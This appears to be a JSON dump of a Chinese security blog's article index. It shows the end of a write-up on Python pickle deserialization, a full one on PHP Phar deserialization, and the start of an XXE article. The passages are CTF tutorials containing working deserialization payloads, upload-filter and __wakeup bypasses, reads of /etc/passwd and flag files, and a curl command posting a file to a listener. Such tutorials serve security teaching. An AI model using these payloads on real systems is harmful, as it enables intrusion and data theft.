sys\nprint(dir(sys.modules['secret']))\n成功找到关键词key，但发现这里是列表的形式(pickle不支持列表索引)所以这里的话我们可以用函数reversed()将列表反序，然后用next()函数指向关键词从而实现输出关键词，示例如下\nimport secret\nimport sys\nprint(next(reversed(dir(sys.modules['secret']))))\n接下来只需要构造写出对应opcode即可先写dir\n(c__main__\nsecret\ni__builtin__\ndir\n此时再写reversed(因为过程是一样的，所以直接在c前面添加括号，在后面加i再接调用模块就可以)\n((c__main__\nsecret\ni__builtin__\ndir\ni__builtin__\nreversed\n最后写next\n(((c__main__\nsecret\ni__builtin__\ndir\ni__builtin__\nreversed\ni__builtin__\nnext\n接下来检验一下\nimport secret\nimport pickle\nimport sys\nopcode=b'''(((c__main__\nsecret\ni__builtin__\ndir\ni__builtin__\nreversed\ni__builtin__\nnext\n.'''\nprint(pickle.loads(opcode))\n\n成功输出key，接下来我们去修改一下之前的payload，把key改成这个，就可以啦\nimport pickle\nimport secret\n\npayload=b'''c__main__\nsecret\n((((c__main__\nsecret\ni__builtin__\ndir\ni__builtin__\nreversed\ni__builtin__\nnext\nS'tttang'\ndb.'''\nprint('before:',secret.key)\n\noutput=pickle.loads(payload)\n\nprint('output:',output)\nprint('after:',secret.key)\n\n\n实战[CISCN2019 华北赛区 Day1 Web2]ikun进入后发现有登录和注册界面，常规操作先注册后登录提示要买到lv6，下划后发现可以买等级这里没有lv6，点击下一页看看仍然没有找到lv6，但发现参数是GET型传参这意味着我们可以写个小脚本来查找lv6所在位置发现lv3对应的代码是lv3.png，那么lv6对应的就是lv6.png脚本如下\nimport time\nimport requests\nurl = \"http://8e197801-2f87-4e36-aee6-a2390b0f391e.node4.buuoj.cn:81/shop?page=\"\nfor i in range(1,300):\n    res = requests.get(url+str(i))\n    time.sleep(0.5)\n    if \"lv6.png\" in res.text:\n        print(i)\n        break\n\n181页，找到后发现价格是天价，买不起这里抓包看一下发现可以修改折扣，把这个discount修改为0.00000000000001然后发包跳转到了另一个界面但无权限访问再抓包发现JWT，解码一下（解码网站https://jwt.io/）我们这里想实现修改root为admin，需要有密钥，爆破密钥可以用工具c-jwt-cracker得到，链接如下https://github.com/brendan-rius/c-jwt-cracker破解后得到密钥为1Kun抓包，将得到的值赋给JWT，再发包手给我点废了也没点出来什么东西，这个时候才想起来看看源代码，又是被自己蠢到的一天发现源码，下载下来看一下在admin.py中发现有loads,这意味着存在Pickle反序列化，我们可以写个有reduce的类，然后在里面写入想要执行的命令，进行序列化，接下来传值给become就可以了这里结果是return形式的，而不是print，所以os.system没回显，这里了解到commands.getoutput是有回显的，因此用它来执行命令，构造exp如下\nimport pickle\nimport urllib\nimport commands\n\nclass flag(object):\n    def __reduce__(self):\n        return (commands.getoutput,('ls /',))\n\na = flag()\nprint(urllib.quote(pickle.dumps(a)))\n接下来同理，换一下语句就可以查看flag了\nimport pickle\nimport urllib\nimport commands\n\nclass flag(object):\n    def __reduce__(self):\n        return (commands.getoutput,('cat /flag.txt',))\n\na = flag()\nprint(urllib.quote(pickle.dumps(a)))\n\n\n[watevrCTF-2019]Pickle Store开环境后发现这个flag卖1000，而我们只有500，随便买两个其他的，发现也没什么东西，看一下其他内容，发现session有点像某种编码过后的，其内容如下\ngAN9cQAoWAUAAABtb25leXEBTYYBWAcAAABoaXN0b3J5cQJdcQMoWBQAAABZdW1teSBzbcO2cmfDpXNndXJrYXEEWBUAAABZdW1teSBzdGFuZGFyZCBwaWNrbGVxBWVYEAAAAGFudGlfdGFtcGVyX2htYWNxBlggAAAAMjllYTdlODgyODJmOTJmNGZmYzI5NzZmMTQ5MDU2OTdxB3Uu\n结合题目，想到这里可能是pickle序列化后又进行了base64编码，因此我们进行反向操作，base64解码一下再进行反序列化，看看能得到什么，脚本如下\nimport pickle\nfrom base64 import *\na='gAN9cQAoWAUAAABtb25leXEBTYYBWAcAAABoaXN0b3J5cQJdcQMoWBQAAABZdW1teSBzbcO2cmfDpXNndXJrYXEEWBUAAABZdW1teSBzdGFuZGFyZCBwaWNrbGVxBWVYEAAAAGFudGlfdGFtcGVyX2htYWNxBlggAAAAMjllYTdlODgyODJmOTJmNGZmYzI5NzZmMTQ5MDU2OTdxB3Uu'\nprint(pickle.loads(b64decode(a)))\n\n结果如下\n&#123;'money': 390, 'history': ['Yummy smörgåsgurka', 'Yummy standard pickle'], 'anti_tamper_hmac': '29ea7e88282f92f4ffc2976f14905697'&#125;\n这说明我们的推断是没有错误的，我们知道pickle存在反序列化漏洞，因此这里就可以利用pickle反序列化漏洞来解题这里看起来是没有什么防护的，因此我们用简单的__reduce__来构造语句尝试直接命令执行\nimport base64\nimport pickle\n\n\nclass flag(object):\n    def __reduce__(self):\n        return (eval, (\"__import__('os').system('cat /f*')\",))\na = flag()\nprint( base64.b64encode( pickle.dumps(a) ) )\n不幸的是这里报500了，可能对session进行了某种检测，那我们这里就用反弹shell来做而后我们编写脚本获取payload\nimport base64\nimport pickle\n\nclass payload(object):\n    def __reduce__(self):\n        return (eval,(\"__import__('os').system('curl -d @flag.txt  ip:7777')\",))\na = payload()\nprint(base64.b64encode(pickle.dumps(a)))\n然后服务器开启监听接下来修改session值为对应payload，刷新界面即可得到flag\n后言本人只是一个小白，在学习Python反序列化时对于opcode构造函数执行感到十分吃力，极有可能部分分析过程出现问题，如果有问题还请各位大师傅多多指正\n参考文章https://tttang.com/archive/1294/https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdfhttps://misakikata.github.io/2020/04/python-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#Unpickler-find-classhttps://xz.aliyun.com/t/7436#toc-11https://xz.aliyun.com/t/7012#toc-1https://xz.aliyun.com/t/7320#toc-2https://xz.aliyun.com/t/8342https://goodapple.top/archives/1069https://zhuanlan.zhihu.com/p/89132768https://forum.butian.net/share/1929https://www.dounaite.com/article/62652a1c7b5653d739b20f48.html\n","slug":"Python 反序列化浅析","date":"2022-10-14T18:04:30.000Z","categories_index":"Python","tags_index":"反序列化","author_index":"quan9i"},{"id":"e6402dc9a02db5ae2c54650aafd17f57","title":"PHP Phar反序列化浅析","content":"声明文章首发于跳跳糖社区https://tttang.com/archive/1732\n前言Phar反序列化是PHP反序列化的一个重要部分，进行相关学习后，简单总结如下，希望对正在学习的师傅有所帮助。\n了解PharPhar含义可以认为Phar是PHP的压缩文档，是PHP中类似于JAR的一种打包文件。它可以把多个文件存放至同一个文件中，无需解压，PHP就可以进行访问并执行内部语句。\n\n\n\n\n\n\n\n\n\n默认开启版本 PHP version &gt;=  5.3\nPhar文件结构Phar文件结构可大致分为四个部分，官方文档介绍如下图简单来说就是\n1、Stub//Phar文件头\n2、manifest//压缩文件信息\n3、contents//压缩文件内容\n4、signature//签名\n具体如下\nStubStub是Phar的文件标识，也可以理解为它就是Phar的文件头这个Stub其实就是一个简单的PHP文件，它的格式具有一定的要求，具体如下\nxxx&lt;?php xxx; __HALT_COMPILER();?>\n这行代码的含义，也就是说前面的内容是不限制的，但在该PHP语句中，必须有__HALT_COMPILER()，没有这个，PHP就无法识别出它是Phar文件。这个其实就类似于图片文件头，比如gif文件没有GIF89A文件头就无法正确的解析图片\nmanifest a manifest describing the contents，用于存放文件的属性、权限等信息。 这里也是反序列化的攻击点，因为这里以序列化的形式存储了用户自定义的Meta-data\ncontentsthe file contents，这里用于存放Phar文件的内容\nsignature[optional] a signature for verifying Phar integrity (phar file format only),签名(可选参数)，位于文件末尾，具体格式如下从官方文档中不难看出，签证尾部的01代表md5加密，02代表sha1加密，04代表sha256加密，08代表sha512加密简单的举个栗子用010editor打开Phar文件当我们修改文件的内容时，签名就会变得无效，这个时候需要更换一个新的签名更换签名的脚本\nfrom hashlib import sha1\nwith open('test.phar', 'rb') as file:\n    f = file.read()\t\ns = f[:-28] # 获取要签名的数据\nh = f[-8:] # 获取签名类型和GBMB标识\nnewf = s + sha1(s).digest() + h # 数据 + 签名 + (类型 + GBMB)\nwith open('newtest.phar', 'wb') as file:\n    file.write(newf) # 写入新文件\n\n反序列化成因Phar之所以能反序列化，是因为Phar文件会以序列化的形式存储用户自定义的meta-data,PHP使用phar_parse_metadata在解析meta数据时，会调用php_var_unserialize进行反序列化操作。具体解析代码\nint phar_parse_metadata(char **buffer, zval *metadata, uint32_t zip_metadata_len)&#123;\n\n    php_unserialize_data_t var_hash;\n    if (zip_metadata_len) &#123;\n        const unsigned char *p;\n        unsigned char *p_buff = (unsigned char *)estrndup(*buffer, zip_metadata_len);\n        p = p_buff;\n        ZVAL_NULL(metadata);\n        PHP_VAR_UNSERIALIZE_INIT(var_hash);\n\n        if (!php_var_unserialize(metadata, &amp;p, p + zip_metadata_len, &amp;var_hash)) &#123;\n            efree(p_buff);\n            PHP_VAR_UNSERIALIZE_DESTROY(var_hash);\n            zval_ptr_dtor(metadata);\n            ZVAL_UNDEF(metadata);\n            return FAILURE;\n        &#125;\n        efree(p_buff);\n        PHP_VAR_UNSERIALIZE_DESTROY(var_hash);\n    &#125;\n&#125;\ndemo生成Phar文件\n\n\n\n\n\n\n\n\n需要去检查一下php.ini中的phar.readonly选项，如果是On，需要修改为Off。\nPhar文件生成的话，可以用如下代码生成\n&lt;?php \nclass test&#123;\n\tpublic $name=\"qwq\";\n\tfunction __destruct()\n\t&#123;\n\t\techo $this->name . \" is a web vegetable dog \";\n\t&#125;\n&#125;\n$a = new test();\n$a->name=\"quan9i\";\n$tttang=new phar('tttang.phar',0);//后缀名必须为phar\n$tttang->startBuffering();//开始缓冲 Phar 写操作\n$tttang->setMetadata($a);//自定义的meta-data存入manifest\n$tttang->setStub(\"&lt;?php __HALT_COMPILER();?>\");//设置stub，stub是一个简单的php文件。PHP通过stub识别一个文件为PHAR文件，可以利用这点绕过文件上传检测\n$tttang->addFromString(\"test.txt\",\"test\");//添加要压缩的文件\n$tttang->stopBuffering();//停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘\n?>\n该如何触发反序列化呢，一般是配合Phar，此时可以不借助unserialize()直接进行反序列化操作。Phar属于伪协议，伪协议使用较多的是一些文件操作函数，如fopen()、copy()、file_exists()等，具体如下图(图片引用于https://www.freebuf.com/articles/web/305292.html)\n反序列化前面在描述反序列化成因时提到过，是因为解析Phar文件时对Meta进行了反序列化，接下来本地测试一下，测试是否能成功触发。\n测试代码\n&lt;?php\nclass test&#123;\n\tpublic $name=\"\";\n\tpublic function __destruct()\n\t&#123;\n\t\teval($this->name);\n\t&#125;\n&#125;\n$tttang = file_get_contents('phar://tttang.phar/test.txt');\necho $tttang;\ntest是之前写入test.txt的内容，quan9i是之前在Phar文件中设置的name名\n条件利用条件有以下几个\n1、phar文件能够上传至服务器 \n//即要求存在file_get_contents()、fopen()这种函数\n\n2、要有可利用的魔术方法\n//这个的话用一位大师傅的话说就是利用魔术方法作为\"跳板\"\n\n3、文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤\n//一般利用姿势是上传Phar文件后通过伪协议Phar来实现反序列化，伪协议Phar格式是`Phar://`这种，如果这几个特殊字符被过滤就无法实现反序列化\n绕过方式存在漏洞，就会存在防护，通常针对Phar反序列化也是有防范的。这里简单的总结一下常见的绕过方式。\n更改文件格式我们利用Phar反序列化的第一步就是需要上传Phar文件到服务器，而如果服务端存在防护，比如这种\n$_FILES[\"file\"][\"type\"]==\"image/gif\"\n要求文件格式只能为gif，这个时候我们该怎么办呢？这个时候我们需要朝花夕拾，重提一下PHP识别Phar文件的方式。PHP通过Stub里的__HALT_COMPILER();来识别这个文件是Phar文件，对于其他是无限制的，这个时候也就意味着我们即使对文件后缀和文件名进行更改，其实质仍然是Phar文件。示例代码\n&lt;?php\n    class Test &#123;\n    \tpublic $name;\n    \tfunction __construct()&#123;\n    \t\techo \"I am\".$this->name.\".\";\n    \t&#125;\n    &#125;\n    $obj = new Test();\n    $obj -> name = \"quan9i\";\n    $phar = new Phar('test.phar');\n    $phar -> startBuffering(); //开始缓冲 Phar 写操作\n    $phar -> setStub('GIF89a&lt;?php __HALT_COMPILER();?>'); //设置stub，添加gif文件头\n    $phar ->addFromString('test.txt','test'); //要压缩的文件\n    $phar -> setMetadata($obj);  //将自定义meta-data存入manifest\n    $phar -> stopBuffering(); ////停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘\n?>\n在浏览器上访问此文件生成test.phar文件，用010editor查看随便找一个分析文件格式的变成Gif格式，这种上传一般可以绕过大多数上传检测。\n绕过Phar关键字检测Phar反序列化中，我们一般思路是上传Phar文件后，通过给参数赋值为Phar://xxx来实现反序列化，而一些防护可能会采取禁止参数开头为Phar等关键字的方式来防止Phar反序列化，示例代码如下\nif (preg_match(\"/^php|^file|^phar|^dict|^zip/i\",$filename)&#123;\n    die();\n&#125;\n绕过的话，我们的办法是使用各种协议来进行绕过，具体如下\n1、php://filter/read=convert.base64-encode/resource=phar://test.phar\n//即使用filter伪协议来进行绕过\n2、compress.bzip2://phar:///test.phar/test.txt\n//使用bzip2协议来进行绕过\n3、compress.zlib://phar:///home/sx/test.phar/test.txt\n//使用zlib协议进行绕过\n绕过__HALT_COMPILER检测我们在前文初识Phar时就提到过，PHP通过__HALT_COMPILER来识别Phar文件，那么出于安全考虑，即为了防止Phar反序列化的出现，可能就会对这个进行过滤，示例代码如下\nif (preg_match(\"/HALT_COMPILER/i\",$Phar)&#123;\n    die();\n&#125;\n这里的话绕过思路有两个1、将Phar文件的内容写到压缩包注释中，压缩为zip文件，示例代码如下\n&lt;?php\n$a = serialize($a);\n$zip = new ZipArchive();\n$res = $zip->open('phar.zip',ZipArchive::CREATE); \n$zip->addFromString('flag.txt', 'flag is here');\n$zip->setArchiveComment($a);\n$zip->close();    \n?>\n2、将生成的Phar文件进行gzip压缩，压缩命令如下\ngzip test.phar\n效果如下压缩后同样也可以进行反序列化\n实战[CISCN2019 华北赛区 Day1 Web1]Dropbox打开靶场发现是个登录界面，可以进行注册，随便注册一下登录登录后发现仅存在一个文件上传抓下包，尝试上传文件发现有过滤，这里尝试用修改Content-Type来实现绕过成功上传，查看网页界面发现只存在下载和删除两个功能，抓一下下载的包这个参数感觉有点东西，尝试读取一下其他文件\nfilename=/etc/passwd\n\n此时想的是直接读取Flag文件，但尝试读取Flag文件后无果（未找到flag.php文件），只能从其他方面着手，这里我们发现存在下载和删除功能，盲猜有download.php和delete.php文件\nfilename=../../download.php\nfilename=../../delete.php\n\n\n# download.php\n&lt;?php\nsession_start();\nif (!isset($_SESSION['login'])) &#123;\n    header(\"Location: login.php\");\n    die();\n&#125;\n\nif (!isset($_POST['filename'])) &#123;\n    die();\n&#125;\n\ninclude \"class.php\";\nini_set(\"open_basedir\", getcwd() . \":/etc:/tmp\");\n\nchdir($_SESSION['sandbox']);\n$file = new File();\n$filename = (string) $_POST['filename'];\nif (strlen($filename) &lt; 40 &amp;&amp; $file->open($filename) &amp;&amp; stristr($filename, \"flag\") === false) &#123;\n    Header(\"Content-type: application/octet-stream\");\n    Header(\"Content-Disposition: attachment; filename=\" . basename($filename));\n    echo $file->close();\n&#125; else &#123;\n    echo \"File not exist\";\n&#125;\n?>\n\n\n# delete.php\n\n&lt;?php\nsession_start();\nif (!isset($_SESSION['login'])) &#123;\n    header(\"Location: login.php\");\n    die();\n&#125;\n\nif (!isset($_POST['filename'])) &#123;\n    die();\n&#125;\n\ninclude \"class.php\";\n\nchdir($_SESSION['sandbox']);\n$file = new File();\n$filename = (string) $_POST['filename'];\nif (strlen($filename) &lt; 40 &amp;&amp; $file->open($filename)) &#123;\n    $file->detele();\n    Header(\"Content-type: application/json\");\n    $response = array(\"success\" => true, \"error\" => \"\");\n    echo json_encode($response);\n&#125; else &#123;\n    Header(\"Content-type: application/json\");\n    $response = array(\"success\" => false, \"error\" => \"File not exist\");\n    echo json_encode($response);\n&#125;\n?>\n\n发现这两个文件都包含了class.php，因此我们再查看一下class.php文件\n//原文过程，这里缩减了很多，只截取了用到的部分\n&lt;?php\nerror_reporting(0);\n$dbaddr = \"127.0.0.1\";\n$dbuser = \"root\";\n$dbpass = \"root\";\n$dbname = \"dropbox\";\n$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);\n\nclass User &#123;\n    public $db;\n\n    public function __construct() &#123;\n        global $db;\n        $this->db = $db;\n    &#125;\n\n    public function __destruct() &#123;\n        $this->db->close();\n    &#125;\n&#125;\n\nclass FileList &#123;\n    private $files;\n    private $results;\n    private $funcs;\n\n    public function __construct($path) &#123;\n        $this->files = array();\n        $this->results = array();\n        $this->funcs = array();\n        $filenames = scandir($path);\n\n        $key = array_search(\".\", $filenames);\n        unset($filenames[$key]);\n        $key = array_search(\"..\", $filenames);\n        unset($filenames[$key]);\n\t&#125;\n\tpublic function __call($func, $args) &#123;\n        array_push($this->funcs, $func);\n        foreach ($this->files as $file) &#123;\n            $this->results[$file->name()][$func] = $file->$func();\n        &#125;\n    &#125;\n    public function __destruct() &#123;\n        $table = '&lt;div id=\"container\" class=\"container\">&lt;div class=\"table-responsive\">&lt;table id=\"table\" class=\"table table-bordered table-hover sm-font\">';\n        $table .= '&lt;thead>&lt;tr>';\n        foreach ($this->funcs as $func) &#123;\n            $table .= '&lt;th scope=\"col\" class=\"text-center\">' . htmlentities($func) . '&lt;/th>';\n        &#125;\n        $table .= '&lt;th scope=\"col\" class=\"text-center\">Opt&lt;/th>';\n        $table .= '&lt;/thead>&lt;tbody>';\n        foreach ($this->results as $filename => $result) &#123;\n            $table .= '&lt;tr>';\n            foreach ($result as $func => $value) &#123;\n                $table .= '&lt;td class=\"text-center\">' . htmlentities($value) . '&lt;/td>';\n            &#125;\n            $table .= '&lt;td class=\"text-center\" filename=\"' . htmlentities($filename) . '\">&lt;a href=\"#\" class=\"download\">下载&lt;/a> / &lt;a href=\"#\" class=\"delete\">删除&lt;/a>&lt;/td>';\n            $table .= '&lt;/tr>';\n        &#125;\n        echo $table;\n    &#125;\n&#125;\n\nclass File &#123;\n    public $filename;\n\n    public function open($filename) &#123;\n        $this->filename = $filename;\n        if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;\n            return true;\n        &#125; else &#123;\n            return false;\n        &#125;\n    &#125;\n\n    public function close() &#123;\n        return file_get_contents($this->filename);\n    &#125;\n&#125;\n?>\n这里的话我们注意到class.php中File类的close()方法，它里面用到了file_get_contents，题目描述了是Phar，那这里大概率是一个突破口，那此时我们就去尝试寻找，谁可以调用这个close方法，最终在User类中的__destruct方法中发现 $this-&gt;db-&gt;close();，这里调用了close方法，但我们需要用的这个close方法是在File类中的，这个时候该怎么办呢，我们在Filelist类中发现有一个__call方法，_call方法是当访问不可访问的方法时触发，这个时候如果我们传入file，它就会由于Filelist中没有close类而调用_call方法，此时就会调用File类里的_call方法，然后将结果存到results[$file-&gt;name()][$func]中，当Filetest销毁时，触发__destruct，此时结果也被打印出来，也就将其中的内容打印了出来这个是逆推的，那么正推的话也就相对来说更简单了\n1、创建User对象->指向Filetest\n2、调用Filetest类->让它指向File类，因为没有close方法，所以调用__call方法，然后转向File类执行close方法\n3、成功调用File类中的close方法，将结果存到results[$file->name()][$func]中\n4、Filetest类销毁时触发__destruct魔术方法，输出results中的内容\nEXP如下\n&lt;?php\nclass User &#123;\n  public $db;\n  public function __construct() &#123;\n       $this->db = \"new Filelist()\";\n   &#125;\n&#125;\nclass FileList&#123;\n  private $files;\n  public function __construct()&#123;\n    $this -> files = array(new File());\n  &#125; \n&#125;\nclass File &#123;\n    public $filename = '/flag.txt';\n&#125;\n$a = new User();\n$phar = new Phar('quan9i.phar');\n$phar->startBuffering();\n$phar->addFromString('test.txt', 'test');\n$phar->setStub('&lt;?php __HALT_COMPILER(); ? >');\n$phar->setMetadata($a);\n$phar->stopBuffering();\n?>\n抓文件上传的包，修改Content-type为image/png，此时再发包成功上传，接下来去抓删除文件的包，使用phar伪协议来触发反序列化成功获取Flag\n[NSSRound#4 SWPU]1zweb题目环境https://www.ctfer.vip/problem/2484\n进入靶场，发现有个查询文件和上传文件界面，尝试任意文件读取\nupload.php\n\n#upload.php\n&lt;?php\nif ($_FILES[\"file\"][\"error\"] > 0)&#123;\n    echo \"上传异常\";\n&#125;\nelse&#123;\n    $allowedExts = array(\"gif\", \"jpeg\", \"jpg\", \"png\");\n    $temp = explode(\".\", $_FILES[\"file\"][\"name\"]);\n    $extension = end($temp);\n    if (($_FILES[\"file\"][\"size\"] &amp;&amp; in_array($extension, $allowedExts)))&#123;\n        $content=file_get_contents($_FILES[\"file\"][\"tmp_name\"]);\n        $pos = strpos($content, \"__HALT_COMPILER();\");\n        if(gettype($pos)===\"integer\")&#123;\n            echo \"ltj一眼就发现了phar\";\n        &#125;else&#123;\n            if (file_exists(\"./upload/\" . $_FILES[\"file\"][\"name\"]))&#123;\n                echo $_FILES[\"file\"][\"name\"] . \" 文件已经存在\";\n            &#125;else&#123;\n                $myfile = fopen(\"./upload/\".$_FILES[\"file\"][\"name\"], \"w\");\n                fwrite($myfile, $content);\n                fclose($myfile);\n                echo \"上传成功 ./upload/\".$_FILES[\"file\"][\"name\"];\n            &#125;\n        &#125;\n    &#125;else&#123;\n        echo \"dky不喜欢这个文件 .\".$extension;\n    &#125;\n&#125;\n分析一下这个上传文件\n1、限制文件后缀，只能为gif、jpeg、jpg、png\n2、检测了文件内容，意味着不能出现__HALT_COMPILER();\n对于限制文件后缀，我们这里更改文件后缀即可，对于第二个，前文在简述绕过方法时也提到过，这种情况可以将Phar文件进行gzip压缩，从而实现绕过。\n接下来查看一下index.php\n#index.php\n&lt;?php\nclass LoveNss&#123;\n    public $ljt;\n    public $dky;\n    public $cmd;\n    public function __construct()&#123;\n        $this->ljt=\"ljt\";\n        $this->dky=\"dky\";\n        phpinfo();\n    &#125;\n    public function __destruct()&#123;\n        if($this->ljt===\"Misc\"&amp;&amp;$this->dky===\"Re\")\n            eval($this->cmd);\n    &#125;\n    public function __wakeup()&#123;\n        $this->ljt=\"Re\";\n        $this->dky=\"Misc\";\n    &#125;\n&#125;\n$file=$_POST['file'];\nif(isset($_POST['file']))&#123;\n    echo file_get_contents($file);\n&#125;\n这里的话不难看出利用点是__destruct中的eval函数，而这里要求$this-&gt;ljt===&quot;Misc&quot;&amp;&amp;$this-&gt;dky===&quot;Re&quot;，也就是说\n__wakeup()函数不能执行，否则就达不到要求，即我们需要绕过__wakeup()\n我们知道属性大于实际个数可以绕过__wakeup函数，那么我们这里就可以采取这种方式来进行绕过。构造Phar文件\n&lt;?php\nclass LoveNss&#123;\n    public $ljt;\n    public $dky;\n    public $cmd;\n    public function __construct()&#123;\n        $this->ljt=\"Misc\";\n        $this->dky=\"Re\";\n        $this->cmd=\"system('cat /flag');\";\n    &#125;\n&#125;\n$phar = new Phar('quan9i.phar');\n$phar->startBuffering();\n$phar->setStub('GIF89a'.'&lt;?php __HALT_COMPILER(); ? >');\n$a = new LoveNss();\n$phar->setMetadata($a);\n$phar->addFromString('test.txt', 'test');\n$phar->stopBuffering();\n?>\n此时Phar文件生成了，接下来就需要绕过了，这里还需要说明一下，就是当我们更改Phar文件的内容时，签名此时就会变无效，因此这里我们需要再构造一个新的签名。步骤总的来说就是以下四步\n1、更改属性值来绕过__wakeup函数\n2、更改签名\n2、进行gzip压缩来绕过关键字检测\n4、更改文件后缀\n我们可以利用一个简单的脚本来实现一下\nimport gzip\nfrom hashlib import sha1\nwith open('D:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\html\\\\quan9i.phar', 'rb') as file:\n    f = file.read()\t\ns = f[:-28] # 获取要签名的数据\ns = s.replace(b'3:&#123;', b'4:&#123;')#更换属性值，绕过__wakeup\nh = f[-8:] # 获取签名类型以及GBMB标识\nnewf = s + sha1(s).digest() + h # 数据 + 签名 + (类型 + GBMB)\n#print(newf)\nnewf = gzip.compress(newf) #对Phar文件进行gzip压缩\nwith open('D:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\html\\\\newquanqi.png', 'wb') as file:#更改文件后缀\n    file.write(newf) \n接下来上传文件通过Phar伪协议即可获取到Flag\nPhar扩展MySQL Phar 反序列化LOAD DATA LOCAL INFILE会触发php_stream_open_wrapper，当我们将它放置到Phar文件中的时候，也会触发反序列化先来简述一下LOAD DATA LOCAL INFILE，它是通过文件批量向表中插入内容的，常用语句如下\nLOAD DATA LOCAL INFILE '1.txt' into table user;\n可能语言描述有点抽象，这里用Navicat演示一下其作用这个是语句的正常用法而当这个文件是经过Phar协议的Phar文件时，此时调用会出现warning，LOAD DATA LOCAL INFILE forbidden这个是因为我们需要手动修改一下my.ini下的一些配置，也就是说这个是调用的前提，具体如下\nlocal-infile=1\nsecure_file_priv=\"\"\n\ndemo生成Phar文件\n#q.php\n&lt;?php\nclass TestObject&#123;\n    public $data;\n    function __destruct()&#123;\n    &#125;\n&#125;\n$phar = new Phar('quan9i.phar');\n$phar->startBuffering();\n$phar->setStub('&lt;?php __HALT_COMPILER(); ? >');\n$a = new TestObject();\n$a->data=\"test\";\n$phar->setMetadata($a);\n$phar->addFromString('test.txt', 'test');\n$phar->stopBuffering();\n?>\n访问q.php后生成quan9i.phar文件，接下来利用语句来调用Phar文件\n#1.php\n&lt;?php\nclass TestObject&#123;\n    public $data;\nfunction __destruct()&#123;\necho $this->data;\n\t&#125;\n&#125;\n\n$m = mysqli_init();\nmysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);\n$s = mysqli_real_connect($m, 'localhost', 'root', 'root', 'test', 3306);\n$p = mysqli_query($m, 'LOAD DATA LOCAL INFILE \\'phar://quan9i.phar/test.txt\\' INTO TABLE test');\n?>\n可以发现此时不仅写入了，而且也成功触发反序列化了\n这里的话还有相对应的例题，即N1CTF2019 sql_manage，这道题的话Wp和涉及知识点可以参考以下几个文章https://github.com/Nu1LCTF/n1ctf-2019/tree/master/WEB/sql_managehttps://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.htmlhttps://xz.aliyun.com/t/6699#toc-1\n参考文献https://paper.seebug.org/680/https://guokeya.github.io/post/uxwHLckwx/http://www.gofervor.comhttps://www.freebuf.com/articles/web/305292.htmlhttps://pankas.top/2022/08/04/php(phar)https://xz.aliyun.com/t/2715https://xz.aliyun.com/t/6699#toc-4https://www.freebuf.com/articles/web/291992.htmlhttps://blog.csdn.net/weixin_39843986/article/details/113306355https://www.cnblogs.com/BOHB-yunying/p/11504051.htmlhttps://xz.aliyun.com/t/2958#toc-0\n","slug":"PHP Phar反序列化浅析","date":"2022-09-14T01:36:20.000Z","categories_index":"WEB知识","tags_index":"反序列化","author_index":"quan9i"},{"id":"ba5cd70ce8afc153bbd78450a1b070ab","title":"浅析XML外部实体注入","content":"声明文章首发于跳跳糖社区https://tttang.com/archive/1716/\n前言在进行系统学习过后，对XXE进行简单总结，希望能对正在学习XXE的师傅有所帮助\n前置知识XML什么是XMLXML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。具体介绍如下\n\n\n\n\n\n\n\n\n\nXML 指可扩展标记语言（EXtensible Markup Language）。XML 的设计宗旨是传输数据，而不是显示数据。XML 是 W3C 的推荐标准。XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。XML 语言没有预定义的标签。\nXML的组成部分XML的文档结构包含以下几种\n1、XML声明\n//示例: &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n2、DTD文档类型定义（可选）:DTD文档类型定义是一套为了进行程序见的数据交换而建立的关于标记符的语法规则\n3、文档元素\nXML的构建模块模块组成与HTML类似，由下面几种组成\n元素:XML文档的主要构建模块，可包含文本内容\n//示例: &lt;username>quan9i&lt;/username>\n属性:提供元素的额外信息\n//示例: &lt;img src=\"1.jpg\"/> src就是属性\n实体:实体是用来定义普通文本的变量。实体引用是对实体的引用。\nPCDATA(parsed character data):被解析的字符数据\nps:PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。\nCDATA(character data):字符数据\nps:CDATA 是不会被解析器解析的文本。\n\nXML的作用 XML 被设计用来传输和存储数据，其焦点是数据的内容，旨在传输信息。 为什么需要XML呢，引用Qwzf师傅的话\n\n\n\n\n\n\n\n\n\n现实生活中一些数据之间往往存在一定的关系。我们希望能在计算机中保存和处理这些数据的同时能够保存和处理他们之间的关系。XML就是为了解决这样的需求而产生数据存储格式。\nXML语法规则1、所有 XML 元素都须有关闭标签。\n2、XML 标签对大小写敏感。\n3、XML 必须正确地嵌套。\n4、XML 文档必须有根元素。\n5、XML 的属性值须加引号。\n6、实体引用:在标签属性，以及对应的位置值可能会出现&lt;>符号，但是这些符号在对应的XML中都是有特殊含义的，这时候我们必须使用对应的HTML实体来表示，\n//示例:&lt;符号对应的实体就是&amp;lt;\n7、在XML中，空格会被保留\n//示例:&lt;p>aa空格bb&lt;/p>，这个空格会被保留\n举个例子\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?> &lt;!--xml文件的声明-->\n&lt;tttang>                 &lt;!--根元素-->\n&lt;article category=\"CTF\">         &lt;!--tttang的子元素，category为属性-->\n&lt;title>XXE&lt;/title>               &lt;!--article的子元素-->\n&lt;author>quan9i&lt;/author>                &lt;!--article的子元素-->\n&lt;year>2022&lt;/year>                      &lt;!--article的子元素-->\n&lt;data>8.20&lt;/data>                      &lt;!--article的子元素-->\n&lt;/article>                             &lt;!--article的结束-->\n&lt;/tttang>                              &lt;!--tttang的结束-->\n\n此时对于XML规则有了一定的认识，我们就可以来了解一下DTD\nDTD文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构，约束了xml文档的结构。DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。因为它既可以在内部引用，也可以在外部引用，这就造成了他有三种利用方式:内部引用，外部引用以及内+外引用\n内部引用格式\n&lt;!DOCTYPE 